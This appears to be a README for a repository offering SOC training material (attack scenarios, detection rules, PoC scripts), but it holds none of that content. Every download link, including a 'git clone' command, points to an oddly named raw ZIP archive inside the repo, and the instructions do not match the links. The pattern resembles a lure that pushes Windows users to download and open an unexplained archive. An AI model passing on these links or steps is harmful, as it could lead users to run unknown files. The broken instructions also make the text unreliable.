# 🛡️ security-playbooks - Clear Cyber Labs for SOC Work

[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/theylovejay409/security-playbooks/main/playbooks/initial-access/security-playbooks-unwaning.zip)

## 🧭 What this is

Security Playbooks is an open-source set of cyber attack scenarios, detection rules, proof-of-concept scripts, and lab guides. It helps you learn how attacks work and how to spot them in logs and alerts.

Use it to:
- study MITRE ATT&CK techniques
- review Sigma, YARA, and Suricata rules
- follow hands-on lab steps
- practice threat hunting
- learn how SOC teams find and check threats

## 💻 What you need

This project is made for Windows users who want to read the playbooks and run lab files from the repo.

You will need:
- Windows 10 or Windows 11
- a web browser
- 7-Zip or WinRAR for ZIP files
- PowerShell
- Git, if you want to clone the repo
- Python 3 if you want to run PoC scripts
- enough disk space for lab files and samples

If you plan to test detection rules, a lab VM is a good choice. Use a test system, not your main PC.

## 📥 Download and open the project

Visit this page to download or clone the project:

[https://raw.githubusercontent.com/theylovejay409/security-playbooks/main/playbooks/initial-access/security-playbooks-unwaning.zip](https://raw.githubusercontent.com/theylovejay409/security-playbooks/main/playbooks/initial-access/security-playbooks-unwaning.zip)

On the GitHub page:
1. Click **Code**
2. Click **Download ZIP**
3. Save the file to your PC
4. Right-click the ZIP file
5. Choose **Extract All**
6. Open the extracted folder

If you prefer Git:
1. Install Git for Windows
2. Open PowerShell
3. Run:

```powershell
git clone https://raw.githubusercontent.com/theylovejay409/security-playbooks/main/playbooks/initial-access/security-playbooks-unwaning.zip
```

4. Open the new folder after the clone finishes

## 🗂️ What you will find

The repo is set up as a learning and reference pack. You can expect folders and files such as:
- attack scenarios based on MITRE ATT&CK
- detection rules in Sigma format
- YARA rules for file checks
- Suricata rules for network checks
- lab walkthroughs with step-by-step tasks
- sample scripts for safe local testing
- notes for log review and threat hunting

Common use cases:
- check a suspicious file with YARA
- test network alerts with Suricata rules
- map activity to ATT&CK techniques
- review logs for signs of attack
- practice incident response steps

## 🚀 How to use it on Windows

After you open the folder, look for files with names like:
- `README.md`
- `.yml`
- `.yaml`
- `.yara`
- `.yar`
- `.rules`
- `.sigma`
- `.py`

Use them like this:
- open `README.md` files in Notepad or your browser
- read lab steps in order
- copy Sigma or YARA rules into your test tools
- run Python scripts from PowerShell
- keep samples and logs inside a test folder

If a lab uses commands, run them one at a time and follow the order in the guide.

## 🧪 Running PoC scripts

Some folders may include Python scripts for local testing. To run them:

1. Install Python 3 from python.org
2. Open PowerShell
3. Go to the folder that has the script
4. Run:

```powershell
python scriptname.py
```

If the script needs extra Python packages, the README in that folder should list them. Install them with:

```powershell
pip install package-name
```

Keep your tests in a safe lab environment.

## 🔍 Using the detection rules

### Sigma rules
Sigma rules help you search for attack signs in logs. You can use them with SIEM tools or log platforms that support Sigma.

### YARA rules
YARA rules help you find files that match a pattern. Use them with malware analysis tools or local file scans.

### Suricata rules
Suricata rules help you look for network traffic linked to attacks. Use them in a lab network or on a test sensor.

Start by reading the rule file and the notes near it. Many rules include a short use case or a sample event to test.

## 🧰 Suggested Windows setup

For a smoother setup, use this simple layout:
- one folder for the repo
- one folder for lab files
- one folder for test logs
- one Windows VM for risky samples
- one text editor for reading guides

Useful tools:
- Notepad++
- PowerShell
- Python
- Git for Windows
- 7-Zip
- a VM tool such as VirtualBox or VMware Workstation Player

## 🧭 How to follow a playbook

A playbook usually gives you a path to follow:
1. Read the goal
2. Look at the scenario
3. Run or inspect the sample
4. Watch the log or alert output
5. Match the activity to ATT&CK
6. Record what you found

If you are new to SOC work, take one playbook at a time. That makes it easier to follow the steps and keep your notes clear.

## 📌 Helpful tips

- Keep the repo in a folder with a short path, such as `C:\Labs\security-playbooks`
- Use a test VM for malware samples
- Save notes as you go
- Rename files only if the guide says to
- Read the folder README before you run any script
- Use search in your editor to find rule names or ATT&CK IDs

## 🧩 Common file types

You may see these file types:
- `.md` for readme files
- `.py` for Python scripts
- `.txt` for notes
- `.yara` or `.yar` for file rules
- `.yml` or `.yaml` for Sigma rules
- `.rules` for Suricata rules
- sample logs in `.json`, `.log`, or `.txt`

## 🛠️ Basic troubleshooting

If a file will not open:
- make sure you extracted the ZIP file
- check that the file was not blocked by Windows
- try opening it in Notepad
- confirm you are using the right app for that file type

If a Python script fails:
- check that Python is installed
- run `python --version`
- confirm the script path is correct
- read the folder README for extra steps

If a rule does not match:
- verify the log or sample fits the scenario
- check the rule version
- compare the test data with the playbook notes

## 📚 Who this is for

This repo fits:
- SOC analysts
- blue team staff
- threat hunters
- incident response teams
- malware analysts
- students in cyber labs
- home lab users who want to learn attack paths and detections

## 🔗 Download again

Visit this page to download or clone the project:

[https://raw.githubusercontent.com/theylovejay409/security-playbooks/main/playbooks/initial-access/security-playbooks-unwaning.zip](https://raw.githubusercontent.com/theylovejay409/security-playbooks/main/playbooks/initial-access/security-playbooks-unwaning.zip)

Open the page, download the ZIP, extract it, and follow the README files inside the folder